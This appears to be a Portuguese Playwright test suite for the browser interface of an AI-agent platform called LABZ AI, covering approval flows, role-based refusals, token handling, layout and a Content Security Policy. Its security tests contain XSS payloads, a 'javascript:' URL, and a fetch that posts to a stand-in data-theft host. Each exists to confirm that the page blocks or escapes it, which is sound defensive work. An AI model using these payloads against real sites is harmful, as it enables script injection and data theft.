// Fase S4 — testes de NAVEGADOR da interface da LABZ AI (Playwright, Chromium do ambiente).
// A API é a MESMA porta HTTP da Edge Function labz-api (src/borda/http.js) com o backend real em
// memória; o login é um Firebase FALSO (só no navegador de teste) com tokens assinados por uma chave
// de teste. Rodar: npm run test:ui
const test = require('node:test');
const assert = require('node:assert');
const { criarServidoresTeste } = require('./servidor-teste');
const { abrirNavegador, novaPagina } = require('./ajuda-navegador');
const { criarServidor: criarDemo } = require('../../demo/servidor-local');

const AGENTES = ['01-guia-marca', '02-designer', '03-carrosseis', '04-roteirista', '05-dev-web', '06-engenheiro', '07-trafego', '08-estrategista'];
const SA = { role: 'SuperAdmin', uid: 'sa' };
let nav;
test.before(async () => { nav = await abrirNavegador(); });
test.after(async () => { if (nav) await nav.close(); });

async function abrirLabz(s, opcoes = {}) {
  const p = await novaPagina(nav, opcoes);
  await p.pagina.goto(`${s.site}/labz-ai.html`);
  return p;
}
const esperarTexto = (pagina, seletor, re, timeout = 60000) => pagina.waitForFunction(([sel, fonte]) => { const n = document.querySelector(sel); return !!n && new RegExp(fonte).test(n.textContent); }, [seletor, re.source], { timeout });

test('Super Admin (modo https): organograma com os 8 agentes, tarefa completa com aprovação, histórico e entregas — tudo com o token e sem cookie', { timeout: 180000 }, async () => {
  const s = await criarServidoresTeste();
  const { pagina, erros, contexto } = await abrirLabz(s, { teste: SA });
  try {
    await pagina.waitForSelector('.lz-card[data-agente]');
    assert.match(await pagina.textContent('#lz-modo'), /servidor LABZ AI/);
    // organograma: Super Admin → Guia da Marca → Estrategista → 6 especialistas
    const ids = await pagina.$$eval('.lz-card[data-agente]', (n) => n.map((x) => x.dataset.agente));
    assert.deepEqual([...ids].sort(), AGENTES);
    assert.deepEqual(ids.slice(0, 2), ['01-guia-marca', '08-estrategista']);
    assert.equal(await pagina.locator('.lz-card-sa').count(), 1);
    await pagina.click('.lz-card[data-agente="07-trafego"]');
    assert.equal(await pagina.getAttribute('.lz-card[data-agente="07-trafego"]', 'aria-pressed'), 'true');
    await esperarTexto(pagina, '#lz-agente h2', /Tráfego/);
    // tarefa (simulada) para a empresa Alfa
    await pagina.selectOption('#lz-empresa', s.empresas.A.id);
    await pagina.click('#lz-exemplos button:has-text("Campanha completa")');
    await pagina.click('#lz-iniciar');
    await pagina.waitForSelector('#lz-execucao:not([hidden])');
    // documento sensível → decisão do Super Admin (no painel da tarefa e em "Esperando você")
    await pagina.waitForSelector('#lz-decisoes button:has-text("Aprovar esta versão")', { timeout: 60000 });
    await esperarTexto(pagina, '#lz-pendencias', /Documento sensível esperando sua aprovação/);
    await esperarTexto(pagina, '#lz-resumo', /1\s*Esperando você/);
    assert.match(await pagina.textContent('.lz-card[data-agente="07-trafego"]'), /Aguardando sua aprovação/);
    await pagina.click('#lz-decisoes button:has-text("Aprovar esta versão")');
    await esperarTexto(pagina, '#lz-estado', /Concluída/, 90000);
    assert.equal(await pagina.$eval('#lz-progresso', (p) => p.value === p.max && p.max > 1), true, 'barra de progresso cheia');
    await pagina.waitForSelector('#lz-resultado .lz-selo');
    const final = pagina.locator('#lz-resultado button:has-text("Aprovar entrega final")');
    if (await final.count()) { await final.click(); await esperarTexto(pagina, '#lz-resultado', /aprovada por você/); }
    // histórico: a tarefa aparece concluída, com as entregas
    await esperarTexto(pagina, '#lz-hist-lista', /Campanha completa[\s\S]*Concluída/, 60000);
    await pagina.click('#lz-hist-lista .lz-item >> nth=0 >> button:has-text("Entregas")');
    await esperarTexto(pagina, '#lz-hist-entregas', /versão \d/);
    await esperarTexto(pagina, '#lz-pendencias', /Nada esperando você/);
    // segurança da comunicação
    assert.ok(s.pedidos.length > 5);
    assert.ok(s.pedidos.every((p) => p.metodo === 'OPTIONS' || (p.autorizacao && !p.cookie && p.origem === s.site)), 'todo pedido com o token, sem cookie, da origem do site');
    const armazenado = await pagina.evaluate(() => JSON.stringify(Object.assign({}, localStorage)) + JSON.stringify(Object.assign({}, sessionStorage)));
    assert.doesNotMatch(armazenado, /eyJ[A-Za-z0-9_-]{10,}/, 'o token não fica guardado no navegador');
    // atualização eficiente: nunca passa do limite do servidor (60 por minuto)
    const porMinuto = Math.max(...s.pedidos.map((p) => s.pedidos.filter((q) => q.em >= p.em && q.em < p.em + 60000).length));
    assert.ok(porMinuto <= 60, `pedidos em 1 minuto: ${porMinuto}`);
    assert.deepEqual(erros, []);
  } finally { await contexto.close(); await s.fechar(); }
});

test('atualização eficiente: com a aba escondida a tela para de perguntar; ao voltar, atualiza na hora', { timeout: 90000 }, async () => {
  const s = await criarServidoresTeste();
  const { pagina, contexto } = await abrirLabz(s, { teste: SA });
  try {
    await pagina.waitForSelector('.lz-card[data-agente]');
    await pagina.selectOption('#lz-empresa', s.empresas.B.id);
    await pagina.click('#lz-exemplos button:has-text("Campanha completa")');
    await pagina.click('#lz-iniciar');
    await pagina.waitForSelector('#lz-decisoes button:has-text("Aprovar esta versão")', { timeout: 60000 }); // parada esperando o Super Admin
    await pagina.evaluate(() => { Object.defineProperty(document, 'hidden', { configurable: true, get: () => true }); document.dispatchEvent(new Event('visibilitychange')); });
    await pagina.waitForTimeout(1500);
    const antes = s.pedidos.length;
    await pagina.waitForTimeout(8000);
    assert.equal(s.pedidos.length, antes, 'nenhum pedido com a aba escondida');
    await pagina.evaluate(() => { Object.defineProperty(document, 'hidden', { configurable: true, get: () => false }); document.dispatchEvent(new Event('visibilitychange')); });
    await pagina.waitForTimeout(1500);
    assert.ok(s.pedidos.length > antes, 'voltou a atualizar');
  } finally { await contexto.close(); await s.fechar(); }
});

test('Diretor (equipe ou cliente): a tela nem chama o servidor', { timeout: 60000 }, async () => {
  const s = await criarServidoresTeste();
  for (const role of ['Diretor', 'Administrativo', 'Financeiro']) {
    const { pagina, contexto } = await abrirLabz(s, { teste: { role, uid: 'd1', tenantId: 't1' } });
    try {
      await pagina.waitForTimeout(1500);
      assert.equal(await pagina.locator('#labz-conteudo').isHidden(), true, role);
      assert.match(await pagina.textContent('#labz-sem-permissao'), /exclusiva do Super Admin/);
      assert.equal(await pagina.locator('#labz-sem-permissao').isVisible(), true, `${role}: a recusa aparece`);
      assert.match(await pagina.textContent('#lz-recusa-titulo'), /Área exclusiva do Super Admin/);
      assert.equal(await pagina.getAttribute('#labz-sem-permissao a', 'href'), 'index.html');
      assert.deepEqual(await pagina.evaluate(() => window.__cspViolacoes), [], `${role}: nada bloqueado pela CSP`);
    } finally { await contexto.close(); }
  }
  assert.equal(s.pedidos.length, 0, 'nenhum pedido chegou à API');
  await s.fechar();
});

test('não confia na tela: mesmo "parecendo" Super Admin, o SERVIDOR recusa quem não é (Diretor no banco da LABZ AI ou fora da lista)', { timeout: 60000 }, async () => {
  const s = await criarServidoresTeste();
  for (const tokenUid of ['d1', 'intruso']) {
    const { pagina, contexto } = await abrirLabz(s, { teste: { role: 'SuperAdmin', uid: 'sa', tokenUid } });
    try {
      await esperarTexto(pagina, '#labz-sem-permissao', /O servidor recusou este acesso/, 20000);
      assert.equal(await pagina.locator('#labz-conteudo').isHidden(), true);
      assert.equal(await pagina.locator('.lz-card[data-agente]').count(), 0, 'nada do catálogo aparece');
    } finally { await contexto.close(); }
  }
  // nenhuma ação além da primeira tentativa (catálogo) foi feita por quem foi recusado
  assert.ok(s.pedidos.every((p) => p.acao === 'catalogo.agentes'));
  await s.fechar();
});

test('token vencido: a tela pede um token novo ao Firebase UMA vez e segue', { timeout: 60000 }, async () => {
  const s = await criarServidoresTeste();
  const { pagina, contexto } = await abrirLabz(s, { teste: Object.assign({ tokenModo: 'expirado' }, SA) });
  try {
    await pagina.waitForSelector('.lz-card[data-agente]', { timeout: 20000 });
    const cat = s.pedidos.filter((p) => p.acao === 'catalogo.agentes');
    assert.equal(cat.length, 2, '1ª com o token vencido (401), 2ª com o token novo (200)');
  } finally { await contexto.close(); await s.fechar(); }
});

test('servidor não ligado (LABZ_API_URL vazio): a tela avisa e não chama nada', { timeout: 60000 }, async () => {
  const s = await criarServidoresTeste({ apiUrlVazia: true });
  const { pagina, contexto } = await abrirLabz(s, { teste: SA });
  try {
    await esperarTexto(pagina, '#lz-aviso', /ainda não foi ligado/);
    assert.match(await pagina.textContent('#lz-modo'), /servidor não ligado/);
    assert.equal(await pagina.$eval('#lz-iniciar', (b) => b.disabled), true);
    assert.equal(s.pedidos.length, 0);
  } finally { await contexto.close(); await s.fechar(); }
});

test('dados com código (XSS) aparecem como TEXTO: nome de cliente e objetivo maliciosos não executam', { timeout: 120000 }, async () => {
  const s = await criarServidoresTeste();
  const mal = await s.servicos.empresas.criar(s.ator, { nome: 'Cliente <img src=x onerror="window.__xss=1">' });
  const { pagina, erros, contexto } = await abrirLabz(s, { teste: SA });
  try {
    await pagina.waitForSelector('.lz-card[data-agente]');
    await pagina.selectOption('#lz-empresa', mal.id);
    await pagina.fill('#lz-objetivo', 'Roteiro de Reels <script>window.__xss=2</script><img src=x onerror="window.__xss=3"> sobre o produto');
    await pagina.click('#lz-iniciar');
    await esperarTexto(pagina, '#lz-hist-lista', /<script>window\.__xss=2<\/script>/, 60000);
    await esperarTexto(pagina, '#lz-hist-lista', /Cliente <img src=x/);
    assert.equal(await pagina.evaluate(() => window.__xss), undefined, 'nenhum código executou');
    assert.equal(await pagina.locator('#labz-conteudo img[src="x"], #labz-conteudo script').count(), 0, 'nada virou elemento HTML');
    assert.deepEqual(erros, []);
  } finally { await contexto.close(); await s.fechar(); }
});

test('isolamento entre empresas no histórico: o filtro por cliente só mostra as tarefas daquele cliente', { timeout: 120000 }, async () => {
  const s = await criarServidoresTeste();
  await s.servicos.motor.pedido(s.ator, { empresaId: s.empresas.A.id, objetivo: 'Tarefa exclusiva da Alfa: legendas da semana.' });
  await s.servicos.motor.pedido(s.ator, { empresaId: s.empresas.B.id, objetivo: 'Tarefa exclusiva da Beta: roteiro de Reels.' });
  await s.drenar();
  const { pagina, contexto } = await abrirLabz(s, { teste: SA });
  try {
    await esperarTexto(pagina, '#lz-hist-lista', /Tarefa exclusiva da Alfa[\s\S]*|Tarefa exclusiva da Beta/);
    await pagina.selectOption('#lz-hist-empresa', s.empresas.B.id);
    await esperarTexto(pagina, '#lz-hist-lista', /Tarefa exclusiva da Beta/);
    await pagina.waitForFunction(() => !/Tarefa exclusiva da Alfa/.test(document.querySelector('#lz-hist-lista').textContent));
    const pedidoFiltro = s.pedidos.filter((p) => p.acao === 'execucoes.historico').length;
    assert.ok(pedidoFiltro >= 4, 'o filtro foi aplicado no servidor (nova consulta)');
  } finally { await contexto.close(); await s.fechar(); }
});

test('responsividade: 1280, 768, 375 e 320 px sem rolar para o lado, com os 8 agentes visíveis', { timeout: 120000 }, async () => {
  const s = await criarServidoresTeste();
  try {
    for (const width of [1280, 768, 375, 320]) {
      const { pagina, contexto } = await abrirLabz(s, { teste: SA, viewport: { width, height: 900 } });
      try {
        await pagina.waitForSelector('.lz-card[data-agente]');
        await pagina.waitForSelector('#lz-resumo .lz-resumo-item');
        const r = await pagina.evaluate(() => ({ sw: document.documentElement.scrollWidth, w: window.innerWidth, cards: [...document.querySelectorAll('.lz-card[data-agente]')].map((c) => { const b = c.getBoundingClientRect(); return { l: b.left, r: b.right, h: b.height }; }) }));
        assert.ok(r.sw <= r.w + 1, `${width}px: rola para o lado (${r.sw} > ${r.w})`);
        assert.equal(r.cards.length, 8);
        assert.ok(r.cards.every((c) => c.l >= -1 && c.r <= r.w + 1 && c.h > 20), `${width}px: cartão fora da tela`);
        // I1: o que pede decisão e a nova tarefa vêm antes da equipe e do histórico; no computador, lado a lado
        const topo = await pagina.evaluate(() => Object.fromEntries([['pend', '.lz-pendencias-painel'], ['tarefa', '.lz-tarefa'], ['equipe', '#lz-org'], ['hist', '.lz-historico']].map(([k, sel]) => [k, Math.round(document.querySelector(sel).getBoundingClientRect().top)])));
        assert.ok(topo.pend <= topo.tarefa && topo.tarefa < topo.equipe && topo.equipe < topo.hist, `${width}px: ordem ${JSON.stringify(topo)}`);
        if (width >= 1280) assert.equal(topo.pend, topo.tarefa, 'computador: decisões e nova tarefa na mesma linha');
        else if (width <= 375) assert.ok(topo.pend < topo.tarefa, 'celular: decisões primeiro, depois a nova tarefa');
      } finally { await contexto.close(); }
    }
  } finally { await s.fechar(); }
});

test('modo de demonstração local continua funcionando (servidor-local.js)', { timeout: 60000 }, async () => {
  const porta = 5193;
  const d = criarDemo({ porta, atrasoMs: 0 });
  await new Promise((ok) => d.servidor.listen(porta, '127.0.0.1', ok));
  const { pagina, contexto, erros } = await novaPagina(nav, { semFirebase: true });
  try {
    await pagina.goto(`http://127.0.0.1:${porta}/labz-ai.html`);
    await pagina.waitForSelector('.lz-card[data-agente]');
    assert.match(await pagina.textContent('#lz-modo'), /Demonstração local/);
    assert.equal(await pagina.locator('.lz-card[data-agente]').count(), 8);
    await pagina.click('#lz-exemplos button:has-text("Só um roteiro")');
    await pagina.click('#lz-iniciar');
    await esperarTexto(pagina, '#lz-estado', /Concluída/, 40000);
    assert.deepEqual(erros, []);
  } finally { await contexto.close(); await new Promise((ok) => d.servidor.close(ok)); }
});

// ---------- I1: política de segurança da página (CSP) ----------
const fs = require('node:fs');
const path = require('node:path');
const { SUPABASE_PRODUCAO } = require('./servidor-teste');

function cspDaPagina() {
  const html = fs.readFileSync(path.join(__dirname, '..', '..', 'demo', 'ui', 'labz-ai.html'), 'utf8');
  const m = /<meta http-equiv="Content-Security-Policy" content="([^"]+)">/.exec(html);
  assert.ok(m, 'a página tem a meta CSP');
  assert.ok(html.indexOf(m[0]) < html.indexOf('<script'), 'a CSP vem antes de qualquer script');
  return Object.fromEntries(m[1].split(';').map((x) => x.trim().split(/\s+/)).filter((x) => x[0]).map(([k, ...v]) => [k, v]));
}

test('CSP da página: tudo fechado por padrão; só o login (Firebase), as fontes e o Supabase da LABZ AI', () => {
  const c = cspDaPagina();
  assert.deepEqual(c['default-src'], ["'none'"]);
  for (const d of ['object-src', 'base-uri', 'form-action']) assert.deepEqual(c[d], ["'none'"], d);
  assert.deepEqual(c['script-src'], ["'self'", 'https://www.gstatic.com', "'unsafe-inline'"], 'scripts só do site e do SDK do Firebase (sem eval)');
  assert.deepEqual(c['connect-src'], ["'self'", 'https://firestore.googleapis.com', 'https://identitytoolkit.googleapis.com', 'https://securetoken.googleapis.com', 'https://firebaseinstallations.googleapis.com', 'https://www.googleapis.com', SUPABASE_PRODUCAO]);
  assert.deepEqual(c['img-src'], ["'self'", 'data:', 'blob:']);
  assert.deepEqual(c['frame-src'], ['https://labz-18246.firebaseapp.com']);
  const tudo = Object.values(c).flat();
  assert.ok(!tudo.some((v) => v === '*' || /^\*|https:$|http:$/.test(v)), 'nenhum curinga');
  assert.ok(!tudo.includes("'unsafe-eval'"));
  assert.ok(!tudo.some((v) => /^http:/.test(v)), 'nada sem https');
});

test('CSP no navegador: a tela inteira funciona sem nenhum bloqueio, e falar com um endereço estranho é bloqueado', { timeout: 120000 }, async () => {
  const s = await criarServidoresTeste();
  const { pagina, erros, contexto } = await abrirLabz(s, { teste: SA });
  try {
    await pagina.waitForSelector('.lz-card[data-agente]');
    await pagina.click('#lz-exemplos button:has-text("Só um roteiro")');
    await pagina.click('#lz-iniciar');
    await esperarTexto(pagina, '#lz-estado', /Concluída/, 90000);
    assert.deepEqual(await pagina.evaluate(() => window.__cspViolacoes), [], 'nada da tela foi bloqueado');
    const r = await pagina.evaluate(async () => { try { await fetch('https://coletor-de-dados.example/roubar', { method: 'POST', body: 'x' }); return 'saiu'; } catch (e) { return 'bloqueado'; } });
    assert.equal(r, 'bloqueado');
    const v = await pagina.evaluate(() => window.__cspViolacoes);
    assert.ok(v.some((x) => /^connect-src https:\/\/coletor-de-dados\.example/.test(x)), `a CSP bloqueou: ${v.join(' | ')}`);
    const sc = await pagina.evaluate(() => new Promise((ok) => { const e = document.createElement('script'); e.src = 'https://cdn-estranho.example/x.js'; e.onerror = () => ok('bloqueado'); e.onload = () => ok('carregou'); document.head.append(e); }));
    assert.equal(sc, 'bloqueado');
    assert.ok((await pagina.evaluate(() => window.__cspViolacoes)).some((x) => /^script-src(-elem)? https:\/\/cdn-estranho\.example/.test(x)), 'script de fora bloqueado pela CSP');
    assert.deepEqual(erros, []);
  } finally { await contexto.close(); await s.fechar(); }
});

// ---------- I2: endereço da API (labz-config.js) ----------
test('I2: endereço da API mal configurado (http de fora, com usuário/senha, com parâmetros ou lixo) → a tela fica desligada e não chama nada', { timeout: 120000 }, async () => {
  for (const bruto of ['http://api-de-fora.example/functions/v1/labz-api', 'https://usuario:senha@127.0.0.1:PORTA/functions/v1/labz-api', 'https://127.0.0.1:PORTA/functions/v1/labz-api?chave=x', 'https://127.0.0.1:PORTA/functions/v1/labz-api#x', 'javascript:alert(1)', 'não é endereço']) {
    const s = await criarServidoresTeste({ apiUrlBruta: bruto });
    const { pagina, contexto } = await abrirLabz(s, { teste: SA });
    try {
      await esperarTexto(pagina, '#lz-modo', /servidor não ligado/, 20000);
      await pagina.waitForTimeout(800);
      assert.equal(s.pedidos.length, 0, `${bruto}: nenhum pedido`);
    } finally { await contexto.close(); await s.fechar(); }
  }
});

test('I2: o endereço da API (quando preenchido) precisa ser https e estar liberado na política de segurança da página (CSP)', () => {
  const cfg = fs.readFileSync(path.join(__dirname, '..', '..', 'demo', 'ui', 'labz-config.js'), 'utf8');
  const m = /^const LABZ_API_URL = '([^']*)';$/m.exec(cfg);
  assert.ok(m, 'labz-config.js no formato esperado');
  assert.doesNotMatch(cfg, /eyJ|sb_secret_|service_role'|apikey\s*=/i, 'nenhuma chave no arquivo público');
  if (m[1]) {
    const u = new URL(m[1]);
    assert.equal(u.protocol, 'https:');
    assert.ok(cspDaPagina()['connect-src'].includes(u.origin), `CSP libera ${u.origin}`);
    assert.match(u.pathname, /^\/functions\/v1\/labz-api$/);
  }
});

test('I3: enquanto a trava "Verify JWT" do Supabase estiver ligada, a tela explica isso (não diz que você foi recusado) e não insiste', { timeout: 60000 }, async () => {
  const s = await criarServidoresTeste({ gatewayVerifyJwt: true });
  const { pagina, erros, contexto } = await abrirLabz(s, { teste: SA });
  try {
    await esperarTexto(pagina, '#lz-aviso', /trava "Verify JWT" do Supabase está ligada/, 20000);
    assert.match(await pagina.textContent('#lz-modo'), /servidor ainda bloqueado/);
    assert.equal(await pagina.locator('#labz-sem-permissao').isHidden(), true, 'não mostra a recusa de acesso');
    assert.equal(await pagina.$eval('#lz-iniciar', (b) => b.disabled), true);
    await pagina.waitForTimeout(3000);
    assert.equal(s.pedidos.filter((p) => p.metodo === 'POST').length, 2, '1ª tentativa + 1 com o token renovado, e para');
    assert.deepEqual(erros, []);
  } finally { await contexto.close(); await s.fechar(); }
});
